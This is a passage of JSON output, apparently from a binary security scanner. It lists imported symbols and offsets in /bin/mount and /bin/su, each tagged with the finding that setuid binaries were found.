                  "details": "Offset: 0x0000ddc0, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddc8, Symbol: mnt_context_is_nocanonicalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddd0, Symbol: prctl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddd8, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dde0, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dde8, Symbol: mnt_context_enable_fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddf0, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ddf8, Symbol: mnt_init_debug, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de00, Symbol: mnt_context_syscall_called, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de08, Symbol: err, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de10, Symbol: mnt_context_set_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de18, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de20, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de28, Symbol: mnt_new_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de30, Symbol: mnt_context_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de38, Symbol: mnt_fs_is_pseudofs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de40, Symbol: mnt_context_get_excode, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de48, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de50, Symbol: mnt_free_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de58, Symbol: mnt_context_is_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de60, Symbol: mnt_context_set_target_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de68, Symbol: mnt_unref_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de70, Symbol: mnt_fs_is_netfs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de78, Symbol: getegid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de80, Symbol: mnt_optstr_get_option, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de88, Symbol: mnt_context_enable_sloppy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de90, Symbol: mnt_table_set_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000de98, Symbol: mnt_context_set_mflags, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dea0, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dea8, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000deb0, Symbol: mnt_context_get_mtab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000deb8, Symbol: mnt_context_get_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dec0, Symbol: mnt_get_library_version, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dec8, Symbol: memmove, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ded0, Symbol: mnt_context_is_parent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000ded8, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dee0, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dee8, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000def0, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000def8, Symbol: mnt_pretty_path, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df00, Symbol: mnt_context_set_options_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df08, Symbol: mnt_free_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df10, Symbol: mnt_context_disable_canonicalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df18, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df20, Symbol: mnt_context_set_fstype_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df28, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df30, Symbol: mnt_context_append_options, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df38, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df40, Symbol: mnt_context_get_mflags, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df48, Symbol: fwrite, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df50, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df58, Symbol: mnt_context_enable_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df60, Symbol: mnt_context_set_optsmode, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df68, Symbol: mnt_fs_get_options, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df70, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df78, Symbol: mnt_table_parse_fstab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df80, Symbol: mnt_context_disable_mtab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df88, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df90, Symbol: mnt_tag_is_valid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000df98, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfa0, Symbol: mnt_fs_set_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfa8, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfb0, Symbol: mnt_context_get_status, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfb8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfc0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfc8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfd0, Symbol: environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfd8, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000dfe0, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e020, Symbol: __progname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e028, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e030, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e040, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/mount",
                  "details": "Offset: 0x0000e060, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011b98, Symbol: endgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ba0, Symbol: getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ba8, Symbol: sigprocmask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bb0, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bb8, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bc0, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bc8, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bd0, Symbol: __vfprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bd8, Symbol: abort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011be0, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011be8, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bf0, Symbol: fdatasync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011bf8, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c00, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c08, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c10, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c18, Symbol: pam_set_item, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c20, Symbol: warn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c28, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c30, Symbol: isatty, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c38, Symbol: sigaction, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c40, Symbol: strtod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c48, Symbol: localeconv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c50, Symbol: clock_gettime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c58, Symbol: setenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c60, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c68, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c70, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c78, Symbol: __strtol_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c80, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c88, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c90, Symbol: wait3, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011c98, Symbol: getpwuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ca0, Symbol: clearenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ca8, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cb0, Symbol: stpcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cb8, Symbol: pam_chauthtok, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cc0, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cc8, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cd0, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cd8, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ce0, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ce8, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cf0, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011cf8, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d00, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d08, Symbol: errx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d10, Symbol: dup2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d18, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d20, Symbol: warnx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d28, Symbol: nanosleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d30, Symbol: dup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d38, Symbol: gettimeofday, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d40, Symbol: pam_getenvlist, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d48, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d50, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d58, Symbol: __strtoul_internal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d60, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d68, Symbol: setusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d70, Symbol: signalfd, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d78, Symbol: ioctl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d80, Symbol: updwtmpx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d88, Symbol: fgetc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d90, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011d98, Symbol: setgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011da0, Symbol: setsid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011da8, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011db0, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011db8, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dc0, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dc8, Symbol: getusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dd0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011dd8, Symbol: strndup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011de0, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011de8, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011df0, Symbol: putenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011df8, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e00, Symbol: sigemptyset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e08, Symbol: basename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e10, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e18, Symbol: sigfillset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e20, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e28, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e30, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e38, Symbol: openpty, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e40, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e48, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e50, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e58, Symbol: err, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e60, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e68, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e70, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e78, Symbol: pam_close_session, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e80, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e88, Symbol: getegid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e90, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011e98, Symbol: strsignal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ea0, Symbol: ttyname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ea8, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011eb0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011eb8, Symbol: cfmakeraw, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ec0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ec8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ed0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ed8, Symbol: poll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ee0, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ee8, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ef0, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ef8, Symbol: tcgetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f00, Symbol: tcsetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f08, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f10, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f18, Symbol: dcngettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f20, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f28, Symbol: execvp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f30, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f38, Symbol: sysinfo, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f40, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f48, Symbol: getgrnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f50, Symbol: pam_acct_mgmt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f58, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f60, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f68, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f70, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f78, Symbol: pam_setcred, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f80, Symbol: pam_authenticate, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f88, Symbol: pam_open_session, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f90, Symbol: initgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011f98, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fa0, Symbol: endusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fa8, Symbol: sigaddset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fb0, Symbol: execv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fb8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fc0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fc8, Symbol: __sprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fd0, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fd8, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fe0, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011fe8, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00011ff0, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012020, Symbol: __progname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012028, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012030, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
                  "details": "Offset: 0x00012040, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/su",
